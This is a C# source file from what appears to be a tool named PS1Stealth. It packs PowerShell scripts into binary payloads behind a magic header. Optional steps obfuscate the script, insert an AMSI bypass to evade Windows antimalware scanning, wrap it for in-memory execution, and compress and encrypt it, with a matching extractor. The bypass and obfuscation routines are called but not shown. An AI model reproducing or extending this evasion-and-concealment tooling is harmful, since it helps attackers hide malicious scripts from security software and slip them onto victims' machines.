using System.Text;

namespace PS1Stealth.Core;

public static class BinaryHelper
{
    // Magic signature to identify embedded payloads
    private static readonly byte[] MagicSignature = Encoding.ASCII.GetBytes("PS1X");

    public static byte[] PreparePayload(string script, string? password, bool compress, ObfuscationLevel obfuscationLevel = ObfuscationLevel.None, bool addAMSIBypass = false, bool prepareForInMemory = false)
    {
        var processedScript = script;

        // Apply obfuscation first (before encryption)
        if (obfuscationLevel != ObfuscationLevel.None)
        {
            processedScript = PowerShellObfuscator.Obfuscate(processedScript, obfuscationLevel);
        }

        // Add AMSI bypass if requested
        if (addAMSIBypass)
        {
            processedScript = PowerShellObfuscator.AddAMSIBypass(processedScript);
        }

        // Wrap for in-memory execution if requested
        if (prepareForInMemory)
        {
            processedScript = PowerShellObfuscator.WrapForInMemoryExecution(processedScript);
        }

        var scriptBytes = Encoding.UTF8.GetBytes(processedScript);

        // Optionally compress
        if (compress)
        {
            scriptBytes = CryptoHelper.Compress(scriptBytes);
        }

        // Optionally encrypt
        if (!string.IsNullOrEmpty(password))
        {
            scriptBytes = CryptoHelper.Encrypt(Encoding.UTF8.GetString(scriptBytes), password);
        }

        // Add metadata header
        var header = CreateHeader(scriptBytes.Length, compress, !string.IsNullOrEmpty(password));
        var payload = new byte[header.Length + scriptBytes.Length];
        
        Buffer.BlockCopy(header, 0, payload, 0, header.Length);
        Buffer.BlockCopy(scriptBytes, 0, payload, header.Length, scriptBytes.Length);

        return payload;
    }

    public static string ExtractPayload(byte[] data, string? password)
    {
        // Find magic signature
        var signatureIndex = FindSignature(data);
        if (signatureIndex == -1)
            throw new Exception("No embedded payload found");

        // Read header
        var headerStart = signatureIndex;
        var dataLength = BitConverter.ToInt32(data, headerStart + 4);
        var flags = data[headerStart + 8];
        var isCompressed = (flags & 0x01) != 0;
        var isEncrypted = (flags & 0x02) != 0;

        // Extract payload
        var payloadStart = headerStart + 12;
        var payloadBytes = new byte[dataLength];
        Buffer.BlockCopy(data, payloadStart, payloadBytes, 0, dataLength);

        // Decrypt if needed
        if (isEncrypted)
        {
            if (string.IsNullOrEmpty(password))
                throw new Exception("Payload is encrypted but no password provided");

            var decrypted = CryptoHelper.Decrypt(payloadBytes, password);
            payloadBytes = Encoding.UTF8.GetBytes(decrypted);
        }

        // Decompress if needed
        if (isCompressed)
        {
            payloadBytes = CryptoHelper.Decompress(payloadBytes);
        }

        return Encoding.UTF8.GetString(payloadBytes);
    }

    private static byte[] CreateHeader(int dataLength, bool compressed, bool encrypted)
    {
        var header = new byte[12];
        
        // Magic signature (4 bytes)
        Buffer.BlockCopy(MagicSignature, 0, header, 0, 4);
        
        // Data length (4 bytes)
        var lengthBytes = BitConverter.GetBytes(dataLength);
        Buffer.BlockCopy(lengthBytes, 0, header, 4, 4);
        
        // Flags (1 byte): bit 0 = compressed, bit 1 = encrypted
        byte flags = 0;
        if (compressed) flags |= 0x01;
        if (encrypted) flags |= 0x02;
        header[8] = flags;
        
        // Reserved (3 bytes)
        
        return header;
    }

    private static int FindSignature(byte[] data)
    {
        for (int i = 0; i <= data.Length - MagicSignature.Length; i++)
        {
            bool found = true;
            for (int j = 0; j < MagicSignature.Length; j++)
            {
                if (data[i + j] != MagicSignature[j])
                {
                    found = false;
                    break;
                }
            }
            if (found) return i;
        }
        return -1;
    }

    public static byte[] ToLittleEndian32(int value)
    {
        return BitConverter.GetBytes(value);
    }

    public static byte[] ToBigEndian32(int value)
    {
        var bytes = BitConverter.GetBytes(value);
        if (BitConverter.IsLittleEndian)
            Array.Reverse(bytes);
        return bytes;
    }

    public static int FromLittleEndian32(byte[] bytes, int offset = 0)
    {
        return BitConverter.ToInt32(bytes, offset);
    }

    public static int FromBigEndian32(byte[] bytes, int offset = 0)
    {
        var temp = new byte[4];
        Buffer.BlockCopy(bytes, offset, temp, 0, 4);
        if (BitConverter.IsLittleEndian)
            Array.Reverse(temp);
        return BitConverter.ToInt32(temp, 0);
    }
}
